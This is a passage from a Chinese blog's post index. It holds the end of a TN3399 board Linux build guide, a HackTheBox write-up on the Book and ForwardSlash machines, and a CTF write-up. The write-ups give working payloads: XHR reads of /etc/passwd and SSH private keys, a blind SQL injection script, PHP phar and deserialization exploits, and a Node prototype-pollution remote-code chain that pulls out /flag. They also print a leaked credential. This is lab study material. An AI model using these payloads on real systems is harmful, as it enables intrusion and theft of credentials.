RK_PD0 RK_FUNC_GPIO \u0026amp;pcfg_pull_none\u0026gt;;\r};\ruser_led4: user_led4 {\rrockchip,pins =\r\u0026lt;4 RK_PD4 RK_FUNC_GPIO \u0026amp;pcfg_pull_none\u0026gt;;\r};\rwlan_led: wlan_led {\rrockchip,pins =\r\u0026lt;4 RK_PD5 RK_FUNC_GPIO \u0026amp;pcfg_pull_none\u0026gt;;\r};\rbt_led: bt_led {\rrockchip,pins =\r\u0026lt;4 RK_PD6 RK_FUNC_GPIO \u0026amp;pcfg_pull_none\u0026gt;;\r};\r};\rpcie {\rpcie_drv: pcie-drv {\rrockchip,pins =\r\u0026lt;2 RK_PA5 RK_FUNC_GPIO \u0026amp;pcfg_pull_none\u0026gt;;\r};\r};\rusb2 {\rhost_vbus_drv: host-vbus-drv {\rrockchip,pins =\r\u0026lt;4 RK_PD1 RK_FUNC_GPIO \u0026amp;pcfg_pull_none\u0026gt;;\r};\r};\r};\r/*\r\u0026amp;spi0 { */\r/* On Low speed expansion (LS-SPI0) */\r/* status = \u0026quot;okay\u0026quot;;\r};\r\u0026amp;spi4 { */\r/* On High speed expansion (HS-SPI1) */\r/*\tstatus = \u0026quot;okay\u0026quot;;\r}; */\r\u0026amp;thermal_zones {\rcpu_thermal: cpu {\rpolling-delay-passive = \u0026lt;100\u0026gt;;\rpolling-delay = \u0026lt;1000\u0026gt;;\rthermal-sensors = \u0026lt;\u0026amp;tsadc 0\u0026gt;;\rsustainable-power = \u0026lt;1550\u0026gt;;\rtrips {\rcpu_alert0: cpu_alert0 {\rtemperature = \u0026lt;65000\u0026gt;;\rhysteresis = \u0026lt;2000\u0026gt;;\rtype = \u0026quot;passive\u0026quot;;\r};\rcpu_alert1: cpu_alert1 {\rtemperature = \u0026lt;75000\u0026gt;;\rhysteresis = \u0026lt;2000\u0026gt;;\rtype = \u0026quot;passive\u0026quot;;\r};\rcpu_crit: cpu_crit {\rtemperature = \u0026lt;95000\u0026gt;;\rhysteresis = \u0026lt;2000\u0026gt;;\rtype = \u0026quot;critical\u0026quot;;\r};\r};\rcooling-maps {\rmap0 {\rtrip = \u0026lt;\u0026amp;cpu_alert1\u0026gt;;\rcooling-device =\r\u0026lt;\u0026amp;cpu_b0 THERMAL_NO_LIMIT THERMAL_NO_LIMIT\u0026gt;,\r\u0026lt;\u0026amp;cpu_b1 THERMAL_NO_LIMIT THERMAL_NO_LIMIT\u0026gt;;\r};\r};\r};\r};\r\u0026amp;usbdrd_dwc3_0 {\rdr_mode = \u0026quot;otg\u0026quot;;\r};\r\u0026amp;usbdrd_dwc3_1 {\rdr_mode = \u0026quot;host\u0026quot;;\r};\r\u0026amp;vcc3v3_pcie {\rgpio = \u0026lt;\u0026amp;gpio2 5 GPIO_ACTIVE_HIGH\u0026gt;;\r};\r\u0026amp;vcc5v0_host {\rgpio = \u0026lt;\u0026amp;gpio4 25 GPIO_ACTIVE_HIGH\u0026gt;;\r};\r 然后还要把linux/arch/arm64/boot/dts/rockchip/rk3399-rock960.dtsi里面改一个网卡型号，在522行\n把网卡改成bcm43455-fmac\n这个不改后面跑起来会莫名其妙占cpu\n编译kernel touch .scmversion # 这个是为了防止编译出来版本号后面带-xxxxx奇怪的东西，给module_install带来麻烦\rmake defconfig\rmake -j24\r 然后等一会，kernel就编译出来了\n找到arch/arm64/boot/Image就是内核二进制文件\n然后找到arch/arm64/boot/dts/rockchip/rk3399-rock960.dtb，这个是dtb。这两个文件留着，接下来要用\n制作rootfs 我讨厌Ubuntu\n下面开始制作debian镜像\nbootstrap 首先apt装一下qemu-aarch64-static\ndebootstrap --arch=arm64 --foreign buster debianFS https://mirrors.ustc.edu.cn/debian/ # 拉个文件系统\rcp /usr/bin/qemu-aarch64-static debianFS/usr/bin/\r 然后准备一下mount.sh\n#!/bin/bash\r# function mnt() {\recho \u0026quot;MOUNTING\u0026quot;\rsudo mount -t proc /proc ${2}proc\rsudo mount -t sysfs /sys ${2}sys\rsudo mount -o bind /dev ${2}dev\rsudo mount -o bind /dev/pts ${2}dev/pts\tsudo chroot ${2}\r}\rfunction umnt() {\recho \u0026quot;UNMOUNTING\u0026quot;\rsudo umount ${2}proc\rsudo umount ${2}sys\rsudo umount ${2}dev/pts\rsudo umount ${2}dev\r}\rif [ \u0026quot;$1\u0026quot; == \u0026quot;-m\u0026quot; ] \u0026amp;\u0026amp; [ -n \u0026quot;$2\u0026quot; ] ;\rthen\rmnt $1 $2\relif [ \u0026quot;$1\u0026quot; == \u0026quot;-u\u0026quot; ] \u0026amp;\u0026amp; [ -n \u0026quot;$2\u0026quot; ];\rthen\rumnt $1 $2\relse\recho \u0026quot;\u0026quot;\recho \u0026quot;Either 1'st, 2'nd or both parameters were missing\u0026quot;\recho \u0026quot;\u0026quot;\recho \u0026quot;1'st parameter can be one of these: -m(mount) OR -u(umount)\u0026quot;\recho \u0026quot;2'nd parameter is the full path of rootfs directory(with trailing '/')\u0026quot;\recho \u0026quot;\u0026quot;\recho \u0026quot;For example: ch-mount -m /media/sdcard/\u0026quot;\recho \u0026quot;\u0026quot;\recho 1st parameter : ${1}\recho 2nd parameter : ${2}\rfi\r 之后挂载并chroot进去\n./mount.sh -m ./debianFS/\n然后开始配文件系统，时区，语言，源，必要的包啥的，还要改一下getty，具体看我的history\ndebootstrap/debootstrap --second-stage\rapt install apt-transport-https\rvi /etc/apt/sources.list\rvi /etc/apt/sources.list\rapt update\ruseradd -G sudo,adm -m -s /bin/bash naivekun\rpasswd naivekun\rvi /etc/sudoers\rapt install sud\rapt install sudo git tmux vim\ruseradd -G sudo -m -s /bin/bash\rln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\rapt install locales\rdpkg-reconfigure locales\rln -s /lib/systemd/system/serial-getty\\@.service /etc/systemd/system/getty.target.wants/serial-getty@ttyS2.service\rapt install alsa-utils libasound2-dev\rapt install ssh ifupdown net-tools udev wget curl\rvi /etc/hostname\rvi /etc/hosts\r 配完记得./mount.sh -u xxx\n安装kernel modules和headers 转到linux目录\nmake modules_install INSTALL_MOD_PATH=../debian_fs/debianFS/\rmake headers_install INSTALL_HDR_PATH=../debian_fs/debianFS/\r 打包kernel和rootfs 首先偷个脚本，来自https://github.com/lanseyujie/tn3399_v3/\n找到那个仓库的build-image.sh\n开始打包 按照原文说明，建好文件目录\n打包boot.img\n打包rootfs.img\n烧进去 还是日常操作，初始化ddr，然后写镜像\nDone! 没什么意外，板子复位就直接跑进系统了，这个rk3399真的牛逼，爆快，4s进登录框\n开机之后wifi会爆炸，因为缺个文件\n如图，把https://github.com/RPi-Distro/firmware-nonfree/blob/master/brcm/brcmfmac43455-sdio.txt下载到/lib/firmware/brcm 当然之前做文件系统的时候放进去最好\n懒得写咋卡刷了，这么牛逼的emmc用啥辣鸡sd卡\n测一下wifi和网卡稳的一批，cpu也没有异常占用，dmesg也没有奇奇怪怪的报错\n后续焊上那俩usb3.0，画了个亚克力外壳，淘宝定做18包邮，前面板接口完美\nsata电源，天线孔，sata硬盘位，风扇，散热孔都有，完美\nsata盘既可以装里面也可以装外面\n需要固件或者图纸的给我发邮件，邮箱见简介 图纸已公开：传送门\n参考链接 \u0026amp;\u0026amp; 致谢  https://www.right.com.cn/forum/thread-4033942-1-1.html dts修改思路和网卡占cpu问题解决来自这个帖子 https://github.com/lanseyujie/tn3399_v3 总体过程参考 http://opensource.rock-chips.com/wiki_Boot_option rockchip官方wiki http://opensource.rock-chips.com/wiki_U-Boot 同上 https://blog.csdn.net/cry1994/article/details/100518871 另一个参考链接  todo 板子右上角那个led接口是否通电是由gpio控制的，准备移植进dtb\n外壳实际厚度2.7mm，插口做的3.0，感觉。。有点松\n补焊的两个usb3，靠近cpu那个usb3用不了，好像它的usb2是连到cpu的，或许是个otg，没有正确配置\n","id":6,"section":"posts","summary":"前一段某鱼有人卖便宜板子TN3399 V3 部分图片来自恩山 部分配置如下 部件名称 芯片型号 备注说明 CPU rk3399 Dual-core Cortex-A72 up to 1.8GHz;Quad-core Cortex-A53 up to 1.4GHz;Mali-T864 GPU RAM K4B8G16 Dual-channel DDR3 1GB;板载 4 颗 Flash","tags":null,"title":"闲鱼便宜板子TN3399折腾全攻略","uri":"https://naivekun.com/2020/07/tn3399/","year":"2020"},{"content":"Book 扫端口，只有80和22\n80是个。。。图书cms\n注册登录进入后台\n没注入上传没法绕xss打了没反应\n有个admin\n注意到一段js\n搜一下，发现了这个https://resources.infosecinstitute.com/sql-truncation-attack/\n大概是，整个填充\nadmin@book.htb++++++a\r select的时候会认为用户不存在，insert的时候超长了会给后面截断，变成admin@book.htb++++++\n然后空格被忽略，从而修改admin密码\n于是进了后台\n发现有个导出pdf功能，普通用户上传的book会把标题和链接弄进去，注意到之前测xss填的书名\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;居然没了，怀疑pdf会解析js\n写个document.write试试\n那xhr去读一下/etc/passwd\n这个东西居然不支持ES6。。。差评\n\u0026lt;script\u0026gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\u0026quot;GET\u0026quot;,\u0026quot;file:///etc/passwd\u0026quot;);x.send();\u0026lt;/script\u0026gt;\r 是可以读的\n读了一圈没啥东西，找私钥吧，发现reader用户私钥可以读出来\n\u0026lt;script\u0026gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\u0026quot;GET\u0026quot;,\u0026quot;file:///home/reader/.ssh/id_rsa\u0026quot;);x.send();\u0026lt;/script\u0026gt;\r 找个ocr网站识别一下，登录即可\n收集一下信息发现有个log rotate，expdb找一下\nhttps://www.exploit-db.com/exploits/47466\n按照说明搞就提权了，略\nForwardSlash 还是只有80和22\n80搞了一通啥都没有\n测下子域名\n有个backup\n注册登录，后台有个lfi\n然后xjb读一波文件，发现dev/index.php有个凭据\nif (@ftp_login($conn_id, \u0026quot;chiv\u0026quot;, 'N0bodyL1kesBack/')) {\rerror_log(\u0026quot;Getting file\u0026quot;);\recho ftp_get_string($conn_id, \u0026quot;debug.txt\u0026quot;);\r}\r 用这个账号密码登ssh即可\n一通信息收集，发现一个backup目录，一个backup二进制文件\n拉回来看看\n大概是取时间然后md5一下作为文件名，读取，然后输出\n那就是个任意文件读，因为有setuid\n整个脚本\n#!/bin/bash\rtarget=$1\rfilename=$(./backup | grep ERROR | awk -F' ' '{print $2}')\recho \u0026quot;filename is $filename\u0026quot;\rln -s $target $filename\r./backup\r 然后成功读一波文件\nconfig.php.bak\nuser.txt\n然后su到pain用户\n发现有个encryptor.py和一个加密后的文件\ndef encrypt(key, msg):\rkey = list(key)\rmsg = list(msg)\rfor char_key in key:\rfor i in range(len(msg)):\rif i == 0:\rtmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])\relse:\rtmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])\rwhile tmp \u0026gt; 255:\rtmp -= 256\rmsg[i] = chr(tmp)\rreturn ''.join(msg)\rdef decrypt(key, msg):\rkey = list(key)\rmsg = list(msg)\rfor char_key in reversed(key):\rfor i in reversed(range(len(msg))):\rif i == 0:\rtmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))\relse:\rtmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))\rwhile tmp \u0026lt; 0:\rtmp += 256\rmsg[i] = chr(tmp)\rreturn ''.join(msg)\rprint encrypt('REDACTED', 'REDACTED')\rprint decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))\r 这里是个自己写的加密，估计是要爆破key\n爆了半天没反应，但是发现奇怪的问题，他这个算法，只要key的首字母一样，长度一样，都能正常解密，如图\n问了下密码学聚聚，大概是，解密的时候，后面错误密钥产生的偏移会让密钥第一个字符，也就是解密最后一轮，给减掉，也就是只要第一位正确就能正常解密\n所以搓了个解密脚本\nimport encrypter\rimport string\rwith open(\u0026quot;ciphertext\u0026quot;) as f:\rdata = f.read()\rfor i in range(2,30):\rfor j in string.letters:\rpassword = i*j\rresult = encrypter.decrypt(password, data)\rif \u0026quot; is \u0026quot; in result:\rprint result\r 然后成功解密\n另外注意到pain用户的sudo可以跑luks\n用解密的密码挂载磁盘\n如图\n拿到私钥，直接用root登录即可\n","id":7,"section":"posts","summary":"Book 扫端口，只有80和22 80是个。。。图书cms 注册登录进入后台 没注入上传没法绕xss打了没反应 有个admin 注意到一段js 搜一下，发现了这","tags":null,"title":"Hackthebox Book and ForwardSlash","uri":"https://naivekun.com/2020/07/htb-book-and-forward-slash/","year":"2020"},{"content":"Crypto Bivibivi from pwn import *\rr=remote(\u0026quot;218.197.154.9\u0026quot;,16387)\rr.recvline()\rpo = r.recvline()\rimport re\rnums_str = re.findall(\u0026quot;\\d+\u0026quot;,po)\rnums=[]\rfor i in nums_str:\rnums.append(int(i))\rans=0\rfor i in range(10000):\rif (i*nums[0]+nums[1] )%nums[3] == nums[2]%nums[3]:\rans=i\rbreak\rr.recvuntil(\u0026quot;x :\u0026quot;)\rr.sendline(str(ans))\rr.recvline()\rr.recvline()\rr.recvline()\rr.recvline()\rr.recvline()\rr.recvline()\r# r.interactive()\rtable='fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF'\rtr={}\rfor i in range(58):\rtr[table[i]]=i\rs=[11,10,3,8,4,6]\rxor=177451812\radd=8728348608\rdef dec(x):\rr=0\rfor i in range(6):\rr+=tr[x[s[i]]]*58**i\rreturn (r-add)^xor\rdef enc(x):\rx=(x^xor)+add\rr=list('BV1 4 1 7 ')\rfor i in range(6):\rr[s[i]]=table[x//58**i%58]\rreturn ''.join(r)\rfor i in range(5):\ravid = int(r.recvline())\rr.sendline(enc(avid))\rr.recvline()\rr.recvline()\rr.recvline()\rwhile 1:\rbvid = r.recvline().strip()\rif bvid[0:2]!=\u0026quot;BV\u0026quot;:\rbreak\rr.sendline(str(dec(bvid)))\rr.interactive()\r Web Easy_sqli 裸的布尔盲注\n闲的蛋疼自己搓了个注入脚本玩玩\nimport requests\rimport string\rimport copy\rpayload = {\r\u0026quot;user\u0026quot;: \u0026quot;asdasd\\\\\u0026quot;,\r\u0026quot;pass\u0026quot;: \u0026quot; || if(ascii(mid((SELECT_STATEMENT),CHAR_OFFSET,1))=ASCII_CHAR,1,0) || 'a'='asdads\u0026quot;\r}\rpayload2 = {\r\u0026quot;user\u0026quot;: \u0026quot;asdasd\\\\\u0026quot;,\r\u0026quot;pass\u0026quot;: \u0026quot; || if(ascii(mid((SELECT_STATEMENT),CHAR_OFFSET,1))\u0026gt;ASCII_CHAR,1,0) || 'a'='asdads\u0026quot;\r}\rdef test_if_true(sql, char, offset):\rurl = \u0026quot;http://218.197.154.9:10011/login.php\u0026quot;\rp = copy.deepcopy(payload)\rp[\u0026quot;pass\u0026quot;] = p[\u0026quot;pass\u0026quot;].replace(\u0026quot;SELECT_STATEMENT\u0026quot;, sql).replace(\u0026quot;CHAR_OFFSET\u0026quot;, str(offset)).replace(\u0026quot;ASCII_CHAR\u0026quot;, str(ord(char)))\rr=requests.post(url, data=p)\rif \u0026quot;Login success\u0026quot; in r.text:\rreturn True\rreturn False\rdef test_if_greater(sql, char, offset):\rurl = \u0026quot;http://218.197.154.9:10011/login.php\u0026quot;\rp = copy.deepcopy(payload2)\rp[\u0026quot;pass\u0026quot;] = p[\u0026quot;pass\u0026quot;].replace(\u0026quot;SELECT_STATEMENT\u0026quot;, sql).replace(\u0026quot;CHAR_OFFSET\u0026quot;, str(offset)).replace(\u0026quot;ASCII_CHAR\u0026quot;, str(ord(char)))\rr=requests.post(url, data=p)\rif \u0026quot;Login success\u0026quot; in r.text:\rreturn True\rreturn False\rwhile 1:\r# sql = input()\r# sql = \u0026quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'f1ag_y0u_wi1l_n3ver_kn0w'\u0026quot;\rsql = \u0026quot;select concat_ws(',',f111114g) from f1ag_y0u_wi1l_n3ver_kn0w\u0026quot;\rif \u0026quot;select\u0026quot; in sql:\rsql = sql.replace(\u0026quot;select\u0026quot;, \u0026quot;seselectlect\u0026quot;)\rif \u0026quot;or\u0026quot; in sql:\rsql = sql.replace(\u0026quot;or\u0026quot;, \u0026quot;oorr\u0026quot;)\rif \u0026quot;from\u0026quot; in sql:\rsql = sql.replace(\u0026quot;from\u0026quot;, \u0026quot;frfromom\u0026quot;)\rif \u0026quot;where\u0026quot; in sql:\rsql = sql.replace(\u0026quot;where\u0026quot;, \u0026quot;whwhereere\u0026quot;)\roffset = 1\rres = \u0026quot;\u0026quot;\rwhile 1:\rl=0\rr=255\rwhile l\u0026lt;r:\rmid = int((l+r)/2)\rresult = test_if_true(sql, chr(mid), offset)\rif result:\rres+=chr(mid)\rprint(res)\roffset+=1\rbreak\relse:\rif test_if_greater(sql, chr(mid), offset):\rl=mid+1\relse:\rr=mid\r ezphp 审代码\n\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__file__);\r$string_1 = $_GET['str1'];\r$string_2 = $_GET['str2'];\r//1st\rif($_GET['num'] !== '23333' \u0026amp;\u0026amp; preg_match('/^23333$/', $_GET['num'])){\recho '1st ok'.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r}\relse{\rdie('会代码审计嘛23333');\r}\r//2nd\rif(is_numeric($string_1)){\r$md5_1 = md5($string_1);\r$md5_2 = md5($string_2);\rif($md5_1 != $md5_2){\r$a = strtr($md5_1, 'pggnb', '12345');\r$b = strtr($md5_2, 'pggnb', '12345');\rif($a == $b){\recho '2nd ok'.\u0026quot;\u0026lt;br\u0026gt;\u0026quot;;\r}\relse{\rdie(\u0026quot;can u give me the right str???\u0026quot;);\r}\r} else{\rdie(\u0026quot;no!!!!!!!!\u0026quot;);\r}\r}\relse{\rdie('is str1 numeric??????');\r}\r//3nd\rfunction filter($string){\rreturn preg_replace('/x/', 'yy', $string);\r}\r$username = $_POST['username'];\r$password = \u0026quot;aaaaa\u0026quot;;\r$user = array($username, $password);\r$r = filter(serialize($user));\rif(unserialize($r)[1] == \u0026quot;123456\u0026quot;){\recho file_get_contents('flag.php');\r}  第一个后面加\\n\n第二个爆破，会把b替换成5，所以找个0e+纯数字的和0e+纯数字+b的\n脚本\nimport hashlib\rdef md5(s):\rreturn hashlib.md5(s.encode(encoding='UTF-8')).hexdigest()\rfor i in range(1,99999999):\rflag = 1\rj = md5(str(i))\rif j[0:2] == '0e':\rfor z in j[2:]:\rif z not in \u0026quot;0123456789b\u0026quot;:\rflag = 0\rbreak\rif flag == 1:\rprint \u0026quot;------------------md5(\u0026quot;+str(i)+\u0026quot;)=\u0026quot;+j\rbreak\r 第三个反序列化逃逸\n$username = 'axxxxxxxxxxxxxxxxxxxx\u0026quot;;i:1;s:6:\u0026quot;123456\u0026quot;;}';\r$password = \u0026quot;aaaaa\u0026quot;;\r ezcmd \u0026lt;?php\rif(isset($_GET['ip'])){\r$ip = $_GET['ip'];\rif(preg_match(\u0026quot;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{1f}]|\\\u0026gt;|\\'|\\\u0026quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026quot;, $ip, $match)){\recho preg_match(\u0026quot;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{20}]|\\\u0026gt;|\\'|\\\u0026quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026quot;, $ip, $match);\rdie(\u0026quot;fxck your symbol!\u0026quot;);\r} else if(preg_match(\u0026quot;/ /\u0026quot;, $ip)){\rdie(\u0026quot;no space!\u0026quot;);\r} else if(preg_match(\u0026quot;/.*f.*l.*a.*g.*/\u0026quot;, $ip)){\rdie(\u0026quot;no flag\u0026quot;);\r} else if(preg_match(\u0026quot;/tac|rm|echo|cat|nl|less|more|tail|head/\u0026quot;, $ip)){\rdie(\u0026quot;cat't read flag\u0026quot;);\r}\r$a = shell_exec(\u0026quot;ping -c 4 \u0026quot;.$ip); echo \u0026quot;\u0026lt;pre\u0026gt;\u0026quot;;\rprint_r($a);\r}\rhighlight_file(__FILE__);\r?\u0026gt;  命令注入 过滤了一堆 空格用$IFS\n555忘了当时咋做了，好像是利用ping的输出传给bash\u0026hellip;..\n后面再补\nezinclude 裸的文件包含\n稍微脑洞一下有个file参数\nhttp://218.197.154.9:10017/thankyou.php?file=php://filter/convert.base64-encode/resource=flag.php\nEasy_unserialize 打开是个上传\n发现这个玩意\nhttp://218.197.154.9:10010/?acti0n=upload\nlfi获取源码\nclass View\r{\rpublic $dir;\rprivate $cmd;\rfunction __construct()\r{\r$this-\u0026gt;dir = 'upload/'.md5($_SERVER['REMOTE_ADDR']).'/';\r$this-\u0026gt;cmd = 'echo \u0026quot;\u0026lt;div style=\\\u0026quot;text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\\\u0026quot;\u0026gt;Powered by: xxx\u0026lt;/div\u0026gt;\u0026quot;;';\rif(!is_dir($this-\u0026gt;dir)) {\rmkdir($this-\u0026gt;dir, 0777, true);\r}\r}\rfunction get_file_list() {\r$file = scandir('.');\rreturn $file;\r}\rfunction show_file_list() {\r$file = $this-\u0026gt;get_file_list();\rfor ($i = 2; $i \u0026lt; sizeof($file); $i++) { echo \u0026quot;\u0026lt;p align=\\\u0026quot;center\\\u0026quot; style=\\\u0026quot;font-weight: bold;\\\u0026quot;\u0026gt;[\u0026quot;.strval($i - 1).\u0026quot;] $file[$i] \u0026lt;/p\u0026gt;\u0026quot;;\r}\r}\rfunction show_img($file_name) {\r$name = $file_name;\r$width = getimagesize($name)[0];\r$height = getimagesize($name)[1];\r$times = $width / 200;\r$width /= $times;\r$height /= $times;\r$template = \u0026quot;\u0026lt;img style=\\\u0026quot;clear: both;display: block;margin: auto;\\\u0026quot; src=\\\u0026quot;$this-\u0026gt;dir$name\\\u0026quot; alt=\\\u0026quot;$file_name\\\u0026quot; width = \\\u0026quot;$width\\\u0026quot; height = \\\u0026quot;$height\\\u0026quot;\u0026gt;\u0026quot;;\recho $template;\r}\rfunction delete_img($file_name) {\r$name = $file_name;\rif (file_exists($name)) {\r@unlink($name);\rif(!file_exists($name)) {\recho \u0026quot;\u0026lt;p align=\\\u0026quot;center\\\u0026quot; style=\\\u0026quot;font-weight: bold;\\\u0026quot;\u0026gt;成功删除! 3s后跳转\u0026lt;/p\u0026gt;\u0026quot;;\rheader(\u0026quot;refresh:3;url=view.php\u0026quot;);\r} else {\recho \u0026quot;Can not delete!\u0026quot;;\rexit;\r}\r} else {\recho \u0026quot;\u0026lt;p align=\\\u0026quot;center\\\u0026quot; style=\\\u0026quot;font-weight: bold;\\\u0026quot;\u0026gt;找不到这个文件! \u0026lt;/p\u0026gt;\u0026quot;;\r}\r}\rfunction __destruct() {\reval($this-\u0026gt;cmd);\r}\r}\r 有个类，那显然就是phar反序列化了\nexp\n$exp=new View();\recho serialize($exp);\r$phar = new Phar(\u0026quot;vul.phar\u0026quot;);\r$phar-\u0026gt;startBuffering();\r$phar-\u0026gt;addFromString(\u0026quot;test.txt\u0026quot;, \u0026quot;test\u0026quot;);\r$phar-\u0026gt;setStub(\u0026quot;GIF89a\u0026lt;?php__HALT_COMPILER(); ?\u0026gt;\u0026quot;);\r$phar-\u0026gt;setMetadata($exp);\r$phar-\u0026gt;stopBuffering();\r 把生成的vul.phar传上去然后\nPOST /view.php\rshow=phar://vul.phar\u0026amp;cmd=phpinfo\u0026amp;args=0\r HappyGame 神仙题目\nnode审计\n拿到源码\n首先merge有问题，可以原型污染\n试了下{\u0026quot;score\u0026quot;: {\u0026quot;constructor\u0026quot;:{\u0026quot;prototype\u0026quot;:{\u0026quot;__proto__\u0026quot;:{\u0026quot;asd\u0026quot;:\u0026quot;blabla\u0026quot;}}}}}即可污染\n然后unserialize的时候for xxx in obj就可以控制传入eval的东西\neval过滤了一大堆\nconst validCode = function (func_code){\rlet validInput = /process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|\u0026quot;|'|\\[|\\+|\\*/ig;\rreturn !validInput.test(func_code);\r};\rconst validInput = function (input){\r// filter bad input\rlet validInput = /process|child_process|main|require|exec|this|function/ig;\rins = serialize(input);\rreturn !validInput.test(ins);\r};\r QAQ后来看了WP才知道可以直接绕，\nBuffer.constructor(Buffer.from(`72657475726e2070726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428276368696c645f70726f6365737327292e6578656353796e6328276c73202f27292e746f537472696e672829`, `he\\\\x78`))()\r 这里用了个玄学方法，没去绕过滤\n注意到题目import了opn模块，看下是啥\n发现可以直接运行命令\n但是拿不到输出，测了半天不出网\n于是看了看node的child_process.spawn，只需要xxx.on('data',(r)=\u0026gt;{写东西})\n但是有个问题，opn是async，所以会返回一个Promise，但是父函数不是async没法await，本地测了一下没法一次带外，可以先on data那里写进本地某个变量，第二个payload再把banner替换掉\n看下opn源码发现windows没啥问题，linux返回的childprocess的 被关了。。。透\n如果上面options.wait为真，下面返回的就是once('close')之后的subprocess，此时subprocess已关闭，拿不到输出。\n如果把options.wait写成假，上面就会把childProcessOptions.stdio设成ignore，还是拿不到输出。。。\nemmm好像搞不了\n再仔细看一下，发现on error的时候会返回一个状态码\n如果exitCode不是0，就把exitCode返回。\n这个时候reject就可以catch一下然后把banner改掉了\na=Array();\ra.push(`bash`);\ra.push(`-c`);\rvar out=Array();\rvar sp=opn(`echo BASE64_HERE | /usr/bin/bas?64 -d \u0026gt; /tmp/naivekun;a=$(cat /tmp/naivekun);exit $a`,\r{app:a,wait:true}\r);\rsp.catch((j)=\u0026gt;{\rconsole.log(j);\rlogs.aaaac=j.toString();\rconsole.log(`FUCK`);\r});\robj.banner=`fuckyou`;\r emmm，这个状态码是命令执行可控的\n做个测试\nwhoami;exit 66\r echo $?可以得到66\n所以数据可以这么带外\n 执行命令，设法获取输出，依次把每一位转化成0-255的ascii码，然后exit 把exit的值on error带出来 把带出来的值给写道某个全局变量里面 第二次把这个全局变量替换成banner输出  这样一次带一位出来，从而获得完整的执行命令的值\n首先测下有啥东西\n找不到东西会返回exit code 127\n跑炸了会出个1还是啥，测了下，python有。所以\npayload0 = \u0026quot;python -c \\\u0026quot;import subprocess;a=subprocess.check_output(['cat','/flag']);print int(ord(a[OFFSET]))\\\u0026quot;\u0026quot;\r 命令过滤了一堆可以echo xxx | bas?64 -d | bash\nexp\nimport requests\rimport base64\rimport re\rimport time\rimport sys\rpayload0 = \u0026quot;python -c \\\u0026quot;import subprocess;a=subprocess.check_output(['cat','/flag']);print int(ord(a[OFFSET]))\\\u0026quot;\u0026quot;\rpayload1 = r'{\u0026quot;score\u0026quot;: {\u0026quot;constructor\u0026quot;:{\u0026quot;prototype\u0026quot;:{\u0026quot;__proto__\u0026quot;:{\u0026quot;asd\u0026quot;:\u0026quot;_$$ND_FUNC$$_(()=\u0026gt;{a=Array();a.push(`bash`);a.push(`-c`);var out=Array();var sp=opn(`echo BASE64_HERE | /usr/bin/bas?64 -d \u0026gt; /tmp/naivekun;a=$(cat /tmp/naivekun);exit $a`,{app:a,wait:true});sp.catch((j)=\u0026gt;{console.log(j);logs.aaaac=j.toString();console.log(`FUCK`);});obj.banner=`fuckyou`;return `asd`})()\u0026quot;,\u0026quot;wait\u0026quot;:\u0026quot;_$$ND_FUNC$$_(()=\u0026gt;{})\u0026quot;}}},\u0026quot;length\u0026quot;:1}}'\rpayload2 = r'{\u0026quot;score\u0026quot;: {\u0026quot;constructor\u0026quot;:{\u0026quot;prototype\u0026quot;:{\u0026quot;__proto__\u0026quot;:{\u0026quot;asd\u0026quot;:\u0026quot;_$$ND_FUNC$$_(()=\u0026gt;{a=Array();a.push(`bash`);a.push(`-c`);var out=Array();var sp=opn(`a=$(bash /tmp/naivekun);exit $a`,{app:a,wait:true});sp.catch((j)=\u0026gt;{console.log(j);logs.aaaac=j.toString();console.log(`FUCK`);});obj.banner=`fuckyou`;return `asd`})()\u0026quot;,\u0026quot;wait\u0026quot;:\u0026quot;_$$ND_FUNC$$_(()=\u0026gt;{})\u0026quot;}}},\u0026quot;length\u0026quot;:1}}'\rpayload3 = r'{\u0026quot;score\u0026quot;: {\u0026quot;constructor\u0026quot;:{\u0026quot;prototype\u0026quot;:{\u0026quot;__proto__\u0026quot;:{\u0026quot;asd\u0026quot;:\u0026quot;_$$ND_FUNC$$_(()=\u0026gt;{obj.banner=logs.aaaac})()\u0026quot;,\u0026quot;wait\u0026quot;:\u0026quot;_$$ND_FUNC$$_(()=\u0026gt;{})\u0026quot;}}},\u0026quot;length\u0026quot;:1}}'\rurl=\u0026quot;http://218.197.154.9:10001/record\u0026quot;\rheaders = {\r\u0026quot;Content-Type\u0026quot;: \u0026quot;application/json\u0026quot;\r}\rfor i in range(1000):\rp0 = payload0.replace(\u0026quot;OFFSET\u0026quot;,str(i))\r# print(p0)\rp1 = payload1.replace(\u0026quot;BASE64_HERE\u0026quot;, base64.b64encode(bytes(p0,'utf-8')).decode('utf-8'))\r# print(p1)\rr=requests.post(url,data=p1, headers=headers)\rtime.sleep(0.2)\rr=requests.post(url, data=payload2, headers=headers)\rtime.sleep(0.2)\rr=requests.post(url, data=payload3, headers=headers)\rtime.sleep(0.2)\r# print(r.text)\rcode = re.findall(\u0026quot;code (\\d+)\u0026quot;,r.text)\r# print(code)\rprint(chr(int(code[0])),end=\u0026quot;\u0026quot;)\rsys.stdout.flush()\r resolve需要时间，中间最好sleep一下\n一位一位猜出来了，比盲注快XD\nMisc 懒得写了23333\n","id":8,"section":"posts","summary":"Crypto Bivibivi from pwn import * r=remote(\u0026quot;218.197.154.9\u0026quot;,16387) r.recvline() po = r.recvline() import re nums_str = re.findall(\u0026quot;\\d+\u0026quot;,po) nums=[] for i in nums_str: nums.append(int(i)) ans=0 for i in range(10000): if 